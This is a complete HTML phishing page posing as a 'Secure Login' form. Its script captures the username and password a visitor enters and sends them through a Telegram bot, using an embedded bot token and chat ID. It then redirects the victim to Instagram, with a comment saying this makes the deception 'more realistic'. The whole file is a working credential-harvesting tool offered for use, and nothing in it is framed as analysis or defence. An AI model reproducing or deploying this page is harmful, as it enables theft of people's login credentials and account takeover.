
<!DOCTYPE html>
<html>
<head>
  <title>Secure Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      text-align: center;
      padding-top: 100px;
    }
    input {
      padding: 10px;
      margin: 10px;
      width: 250px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      padding: 10px 25px;
      border: none;
      border-radius: 5px;
      background-color: #007bff;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h2>Login to Continue</h2>
  <form onsubmit="sendToTelegram(event)">
    <input type="text" id="username" placeholder="Username" required /><br>
    <input type="password" id="password" placeholder="Password" required /><br>
    <button type="submit">Login</button>
  </form>

  <script>
    function sendToTelegram(e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const message = `🚨 New Login Attempt:\n👤 Username: ${username}\n🔐 Password: ${password}`;
      const botToken = "8198334501:AAHSHTAeIzETcnkPAYzO-j0rZ3DmwU1xDeU";
      const chatId = "1364726635";

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }).then(() => {
        alert("Processing login...");
        window.location.href = "https://instagram.com"; // redirect to make it more realistic
      });
    }
  </script>
</body>
</html>
